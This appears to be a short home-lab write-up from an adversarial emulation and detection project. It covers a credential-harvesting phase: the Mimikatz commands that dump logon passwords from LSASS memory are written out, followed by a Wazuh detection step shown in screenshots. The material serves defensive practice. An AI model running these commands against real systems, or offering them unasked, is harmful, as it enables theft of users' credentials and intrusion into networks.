# Adversarial Emulation & Detection Phase 4 : Credential Harvesting

Following the systematic enumeration of domain objects and accounts during the internal discovery phase, attacks shift toward elevating execution privileges. This phase simulates credential harvesting via memory exploitation techniques targeting the Local Security Authority Subsystem Service (LSASS) process. 

## Execution:
``` cmd
mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
```
<img width="1693" height="606" alt="mimikatz-execution" src="https://github.com/user-attachments/assets/7bcdb2d1-7186-468b-bfb9-3dba6e1eee36" />

## Detection:
Filtering for processes ran using cmd:

<img width="1506" height="727" alt="mimikatz-wazuh" src="https://github.com/user-attachments/assets/086770d5-ddc7-42fa-80b9-b885ccfa22c5" />
